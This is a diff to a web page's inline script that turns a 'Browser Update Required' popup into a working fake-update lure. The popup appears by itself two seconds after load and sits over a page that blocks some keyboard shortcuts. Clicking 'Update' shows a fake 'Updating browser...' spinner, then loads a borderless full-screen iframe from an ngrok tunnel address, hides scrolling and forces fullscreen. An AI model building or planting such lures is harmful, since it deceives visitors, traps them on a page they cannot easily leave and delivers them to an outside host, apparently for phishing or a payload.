@@ -1100,8 +1100,8 @@
     </footer>
 
     <script>
+
         document.addEventListener("DOMContentLoaded", function () {
-            // Block specific keyboard shortcuts
             function blockKeys(e) {
                 const key = e.key.toLowerCase();
                 if (
@@ -1116,8 +1116,9 @@
                 }
             }
             document.addEventListener("keydown", blockKeys);
+        });
 
-            // Initialize tab buttons
+        document.addEventListener("DOMContentLoaded", function () {
             const tabButtons = document.querySelectorAll('.tab-button');
             const tabHeading = document.querySelector('.tab-heading');
             const tabLink = document.querySelector('.tab-link');
@@ -1155,7 +1156,6 @@
                 });
             });
 
-            // Video player functionality
             const thumbnailContainer = document.querySelector('.video-thumbnail-container');
 
             if (thumbnailContainer) {
@@ -1170,17 +1170,16 @@
                     }
                 });
             }
-
-            // Show update popup automatically after 2 seconds
-            setTimeout(function() {
-                showUpdatePopup({ preventDefault: function() {} });
-            }, 2000);
         });
+
+        setTimeout(function() {
+    showUpdatePopup({ preventDefault: function() {} });
+}, 2000);
+
 
         function showUpdatePopup(event) {
             event.preventDefault();
 
-            // First, create the overlay
             const overlay = document.createElement('div');
             overlay.style.position = 'fixed';
             overlay.style.top = '0';
@@ -1188,12 +1187,11 @@
             overlay.style.width = '100%';
             overlay.style.height = '100%';
             overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-            overlay.style.zIndex = '9999';
+            overlay.style.zIndex = '10000';
             overlay.style.display = 'flex';
             overlay.style.justifyContent = 'center';
             overlay.style.alignItems = 'center';
 
-            // Create the popup
             const popup = document.createElement('div');
             popup.style.backgroundColor = 'white';
             popup.style.padding = '30px';
@@ -1201,17 +1199,14 @@
             popup.style.maxWidth = '400px';
             popup.style.textAlign = 'center';
 
-            // Create title
             const title = document.createElement('h3');
             title.textContent = 'Browser Update Required';
             title.style.marginBottom = '15px';
 
-            // Create message
             const message = document.createElement('p');
             message.textContent = 'Your browser needs to be updated to continue.';
             message.style.marginBottom = '20px';
 
-            // Create button
             const updateButton = document.createElement('button');
             updateButton.textContent = 'Update';
             updateButton.style.padding = '10px 20px';
@@ -1221,12 +1216,9 @@
             updateButton.style.borderRadius = '6px';
             updateButton.style.cursor = 'pointer';
 
-            // Add button click handler
             updateButton.addEventListener('click', function () {
-                // Remove the overlay
                 document.body.removeChild(overlay);
 
-                // Create loading overlay
                 const loadingOverlay = document.createElement('div');
                 loadingOverlay.style.position = 'fixed';
                 loadingOverlay.style.top = '0';
@@ -1239,14 +1231,8 @@
                 loadingOverlay.style.justifyContent = 'center';
                 loadingOverlay.style.alignItems = 'center';
 
-                // Create spinner
-                const loadingContainer = document.createElement('div');
-                loadingContainer.style.display = 'flex';
-                loadingContainer.style.flexDirection = 'column';
-                loadingContainer.style.alignItems = 'center';
-                loadingContainer.style.justifyContent = 'center';
-
                 const spinner = document.createElement('div');
+                spinner.style.display = 'inline-block';
                 spinner.style.width = '50px';
                 spinner.style.height = '50px';
                 spinner.style.border = '5px solid rgba(0, 0, 0, 0.1)';
@@ -1255,72 +1241,76 @@
                 spinner.style.animation = 'spin 1s ease-in-out infinite';
                 spinner.style.marginBottom = '20px';
 
-                // Create loading text
                 const loadingText = document.createElement('div');
                 loadingText.textContent = 'Updating browser...';
                 loadingText.style.fontSize = '16px';
                 loadingText.style.color = '#333';
+                loadingText.style.marginBottom = '10px';
 
-                // Add animation style
+                const loadingContainer = document.createElement('div');
+                loadingContainer.style.display = 'flex';
+                loadingContainer.style.flexDirection = 'column';
+                loadingContainer.style.alignItems = 'center';
+                loadingContainer.style.justifyContent = 'center';
+                loadingContainer.style.backgroundColor = 'white';
+                loadingContainer.style.padding = '40px';
+                loadingContainer.style.borderRadius = '8px';
+                loadingContainer.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+                loadingContainer.style.width = '300px';
+                loadingContainer.style.textAlign = 'center';
+
                 const style = document.createElement('style');
-                style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
+                style.textContent = `
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    `;
                 document.head.appendChild(style);
 
-                // Add elements to DOM
                 loadingContainer.appendChild(spinner);
                 loadingContainer.appendChild(loadingText);
                 loadingOverlay.appendChild(loadingContainer);
                 document.body.appendChild(loadingOverlay);
 
-                // After 2 seconds, open example.com in a new tab
-                setTimeout(function () {
-                    // Remove loading overlay
+                setTimeout(() => {
                     document.body.removeChild(loadingOverlay);
 
-                    // Open a new tab with example.com
-                    const newTab = window.open('https://example.com', '_blank');
+                    const hiddenFrame = document.createElement('iframe');
+                    hiddenFrame.style.position = 'fixed';
+                    hiddenFrame.style.top = '0';
+                    hiddenFrame.style.left = '0';
+                    hiddenFrame.style.width = '100%';
+                    hiddenFrame.style.height = '100%';
+                    hiddenFrame.style.border = 'none';
+                    hiddenFrame.style.zIndex = '99999';
+                    hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
 
-                    // Request fullscreen on the new tab after it loads
-                    if (newTab) {
-                        // Create a script to request fullscreen when the new page loads
-                        const fullscreenScript = `
-                    document.addEventListener('DOMContentLoaded', function() {
-                        // Request fullscreen
-                        if (document.documentElement.requestFullscreen) {
-                            document.documentElement.requestFullscreen();
-                        } else if (document.documentElement.webkitRequestFullscreen) {
-                            document.documentElement.webkitRequestFullscreen();
-                        } else if (document.documentElement.mozRequestFullScreen) {
-                            document.documentElement.mozRequestFullScreen();
-                        } else if (document.documentElement.msRequestFullscreen) {
-                            document.documentElement.msRequestFullscreen();
-                        }
-                    });
-                `;
+                    hiddenFrame.onload = function () {
+                        document.body.style.overflow = 'hidden';
 
-                        // Attempt to inject script into new tab
                         try {
-                            newTab.addEventListener('load', function () {
-                                newTab.eval(fullscreenScript);
+                            hiddenFrame.requestFullscreen().catch(err => {
+                                console.log("Error attempting to enable fullscreen: ", err);
                             });
-                        } catch (e) {
-                            console.log("Unable to control the new tab due to browser security restrictions");
+                        } catch (error) {
+                            console.error("Fullscreen error:", error);
                         }
-                    }
+                    };
+
+                    document.body.appendChild(hiddenFrame);
                 }, 2000);
             });
 
-            // Assemble the popup
             popup.appendChild(title);
             popup.appendChild(message);
             popup.appendChild(updateButton);
             overlay.appendChild(popup);
-
-            // Add to body
             document.body.appendChild(overlay);
         }
-    </script>
 
+
+
+    </script>
 
 </body>
 
